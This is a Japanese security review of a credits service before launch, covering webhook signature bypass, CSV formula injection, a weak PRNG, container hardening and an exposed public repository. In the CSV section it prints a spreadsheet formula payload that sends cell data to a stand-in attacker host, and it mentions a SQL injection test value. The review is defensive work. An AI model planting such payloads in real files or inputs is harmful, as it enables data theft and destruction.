# セキュリティレビュー — Credits MVP

2026-08-21 / 公開前レビュー / 対象: `packages/` 全体と `site/`

> 実施理由: 公開すればこのサーバは**クレジットを発行する**。発行を誰に許すかが
> 最も高くつく間違いになる。

---

## 1. 発見した脆弱性

### S-01（重大・修正済み）— Stripe webhook の認証バイパス

**症状**: `stripe-signature` ヘッダを**省略するだけ**で署名検証が丸ごとスキップされていた。

```js
// 修正前
if (secret !== null && typeof sig === 'string') {
  verifyStripeSignature(...);   // ← ヘッダが無ければ「検証しない」
}
handleStripeEvent(...);          // ← そのまま実行される
```

**影響**: テナント ID（秘密ではない。bootstrap が標準出力に印字する）を知っていれば、
誰でも偽の `invoice.paid` を投げて**クレジットを無制限に発行できる**。
このシステムで起こりうる最悪の欠陥そのもの — 無からの資金創出。

**修正**: 検証を必須にした。以下はすべて `401`:
- 未知のテナント
- webhook secret が未設定のテナント
- 署名ヘッダの欠落

未知のテナントと署名欠落で**同じ応答**を返すため、テナント ID の存在を探る用途にも使えない。

### S-02（中・修正済み）— 署名を再シリアライズしたボディに対して検証していた

**症状**: `verifyStripeSignature(JSON.stringify(raw), ...)` — パース済みボディを
**再度 JSON 化**したものに対して検証していた。署名は**送信されたバイト列**に対するもので、
再シリアライズは空白もキー順も保存しない。正しい署名を偽と誤判定しうるし、
逆にバイト列と一致しないものを通す余地も残る。

**修正**: `addContentTypeParser` で生のテキストを保持し、**送られてきたバイトそのもの**に対して
検証する。テストは意図的に空白を含むボディで、再シリアライズ方式では通らない形にしてある。

### S-03（低・修正済み）— 動的な SQL 列名

**症状**: `updateTenant` が `patch` のキーを SQL に**文字列として**埋めていた。
現在の呼び出し元はすべてリテラルなので実害はないが、リクエスト由来の値が
一度でも流れ込めば注入経路になる。

**修正**: 書き込み可能な列名を集合で固定し、それ以外は例外にした。
テストは列名に `DROP TABLE register; --` を仕込んで、register が残ることを確認している。

## 3.1 waitlist（2026-08-21 追加）— 公開ページ上の**認証なし**エンドポイント

唯一の個人情報を扱い、見知らぬブラウザから叩かれる。設計の中心は「**何を答えないか**」。

| 脅威 | 対処 |
|---|---|
| **登録済みかどうかの探索** | 新規・既存・重複のいずれでも**同一の 202 と同一の本文**を返す。差があれば「誰が登録したか」の照会窓口になる |
| 大量投稿 | 呼び出し元アドレス単位で既定 5/分。超過は 429 + `Retry-After` |
| ボット | 人間には見えない `company_website` 欄。埋まっていれば **202 を返して何も保存しない**（ボットには成功に見える） |
| 他サイトからの投稿 | `TEGATA_SITE_ORIGINS` の明示的 allowlist。未知オリジンは 403 で、CORS ヘッダも返さない |
| 同一人物の重複 | Gmail 等の**仕様が公開されている**ドメインに限りドット/タグを畳む。未知ドメインは畳まない（別人を統合してしまうため） |
| ログからの漏洩 | ログには `f******@example.com` 形式のみ。ローカル部が2文字以下なら**先頭も見せない**（1文字なら先頭＝全体になるため） |
| 台帳の汚染 | **register に一切書かない。** `spec/register.md` は個人情報を禁じている。専用テーブルで保持・削除規則も別 |
| 意図しない列への書き込み | 受け付けるのは `email` / `locale` / `source` のみ。`id` や `unsubscribed_at` を送っても無視 |

読み出し（CSV エクスポート・件数）は**テナント鍵が必須**。CSV はカンマと引用符を含むアドレスでも壊れない。

**preflight を外したことについて（D-36）。** フォームは JSON を `text/plain` で送るようになり、
ブラウザは preflight OPTIONS を出さなくなった。これで**攻撃面は変わらない**:

- preflight が止めていたのは「ブラウザが要求を送ること」であって「サーバが受理すること」ではない。
  他サイトからの投稿を実際に止めているのは Origin allowlist で、これは単純リクエストでも同じく効く
  （ブラウザは cross-origin POST に必ず `Origin` を付ける → 許可外は 403、保存しない）
- 応答は cross-origin では読めないままである（`Access-Control-Allow-Origin` を返さないため）
- そもそも認証なしの公開エンドポイントなので、preflight の有無に関わらず誰でも直接叩ける。
  物量に対する防衛はレート制限とハニーポットであり、preflight ではなかった

`OPTIONS /v1/waitlist` の応答は残してある（preflight を出すクライアントが壊れないため）。

**素のフォーム投稿（`application/x-www-form-urlencoded`）も受け付ける**（スクリプトが
動かない場合の経路）。この経路でも上表の対処はすべて同じく効く — ハニーポット・
レート制限・Origin allowlist・「登録済みかどうかを答えない」は content-type に依存しない。
違うのは**応答の読み方だけ**で、JSON ではなく1文を返す（着地したページに人間がいるため）。
文面は成功・重複・ボットのいずれでも同一である。

# 5. 2026-08-22 の見直し（オーナー作業を必要としない範囲を全部）

前回の対象はコードの脆弱性だった。今回は**出荷物と運用面**を見た。5件直し、1件は
オーナーの判断が要るので報告に留めた。

## S-04 — 本番の乱数が seeded PRNG だった（**修正済み / 中**）

`main.ts` は `SeededRng(randomBytes(4)…)` を Store に渡していた。mulberry32 は
**状態が32ビット**で、配った ID をいくつか観測すれば以降が復元できる。台帳の
**全 ID がここから出る**（authorization_id、register の entry id、tenant_id）。

直接の悪用経路は狭い（読み出しは全てテナント認証・テナントスコープなので、ID を
当てても何も開かない）。それでも直した理由は、**弱い乱数は後から必ず何かの前提になる**からで、
費用がゼロだからでもある。

- `cryptoRng`（`crypto.getRandomValues`）を core に追加し、composition root で使う
- `buildApp` が受け取っていた `rng` は**どこからも使われていなかった**。しかも
  `new SeededRng(1)` という固定シードで、読む人には本番のバグに見える。引数ごと削除した
- **`check-purity.mjs` が composition root の `new SeededRng(` を落とす。**
  テストが使う行と本番が使う行は diff 上で見分けがつかないので、検査でしか防げない

## S-05 — ウェイトリスト CSV に数式を書き込めた（**修正済み / 中〜高**）

`source` と `locale` は**公開ページの認証なしフォーム**から来る。エクスポートの CSV は
RFC 4180 の引用符処理はしていたが、**先頭が `=` `+` `-` `@` のセルは表計算ソフトで数式**であり、
ファイルを開いた瞬間に実行される。開くのは**エクスポート鍵を持っている本人**である。

```
source = '=HYPERLINK("https://evil.example/"&A1,"click")'
```

二重に塞いだ:

1. **入口** — `source` / `locale` は我々が書く値であって利用者が打つ値ではないので、
   我々が書く形（`[a-z0-9._-]` / BCP-47 風）以外は**切り詰めずに破棄**する
2. **出口** — `csvCell()` が数式になる値の先頭にアポストロフィを付ける。
   保存されている値は変えない（ファイルの性質であって記録の性質ではない）

`email` も対象である。`-founder@example.com` は我々の形式検査を通るため。

## S-06 — 本番イメージに開発依存が全部入っていた（**修正済み / 低〜中**）

`pnpm install --frozen-lockfile`（dev 込み）の結果をそのまま runtime に載せていたので、
vitest / vite / esbuild / autocannon / playwright が本番イメージに入っていた。
現に `pnpm audit` はこの5つに critical 1・high 1 を報告する。**起動しないので悪用経路は
無い**が、無いものは悪用できないという方が強い。

- runtime は `pnpm install --prod` の結果だけ
- 実行時に pnpm も corepack も使わない（`node --import tsx` の単一プロセス）
- **root で走らない**（`USER node`）。`/data` は起動前に所有権を渡す
- `HEALTHCHECK` を追加
- CI は `pnpm audit --prod` で落ちる。**出荷するものに脆弱性が出たときだけ**落ちるので、
  無視される検査にならない

## S-07 — Stripe 署名がローテーション中に落ちた（**修正済み / 可用性**）

`Stripe-Signature` は秘密鍵のローテーション中に **`v1` を複数**含む。ヘッダを
`Object.fromEntries` で読むと**最後の1つしか残らない**ので、ローテーション中の正規の
配信を拒否し得た。全候補を、全部を定数時間で比較する（一致で早期 return しない）。

## S-08 — API 応答にキャッシュ指示が無かった（**修正済み / 低**）

残高・台帳・粗利レポートはテナント固有で、呼び出し元の下で変わる。中間のプロキシが
1件でも保持すると、既に真でない数字を誰かに見せることになる。全応答に
`cache-control: no-store` と `x-content-type-options: nosniff` を付けた。

## S-09 — **リポジトリが既に公開されている**（**未修正 / 要オーナー判断**）

`Torutesu/tegataai` は `"visibility": "public"` である（2026-08-21 作成、既定ブランチは
作業ブランチ）。つまり**現時点で以下が誰でも読める**:

| 出ているもの | 中身 |
|---|---|
| `docs/gtm/icp-target-list.md` | **実名の見込み客リストと、それぞれへの評価** |
| `docs/plan/security-review.md` | **受け入れたリスクの一覧（L-01〜L-05 と本節）** |
| `docs/00-master.md` / `docs/prd/` | 価格の前提、収益計画、ロードマップ |
| `docs/gtm/trademark-brief.md` | 商標の方針 |
| `docs/plan/decision-log.md` | 判断の経緯 |
| `demo/` | ローンチ動画の素材と固定データ |

**認証情報は出ていない**（`sk_live_` / `whsec_` を履歴全体で検索して0件）。
出ているのは**戦略と評判に関わるもの**であり、中でも実名リストへの評価が重い。

`git rm` では解決しない。既に公開された履歴はキャッシュ・フォーク・収集の対象になり得る。
取れる手はこの3つで、**判断はオーナーのものである**:

1. **いますぐ private にし、公開用は別リポジトリで出す**（推奨）。
   `pnpm verify:public` が出す木は、単独で `pnpm verify` を通ることを CI が確認している
2. この木を公開のまま、`docs/` と `demo/` を履歴ごと削除する（`git filter-repo` + force push）。
   フォークされていれば残るが、現在 fork 0・star 0・watcher 0
3. 公開のままにする。**「全部見せる」は一貫した立場ではある** — ただし
   実名リストへの評価だけは、当人が読む前提で書き直すべきである

D-38 で**構造としては**塞いだ（公開木は許可リストから組み立てる）。ここに残るのは、
**既に出ているものをどうするか**という一度きりの判断だけである。
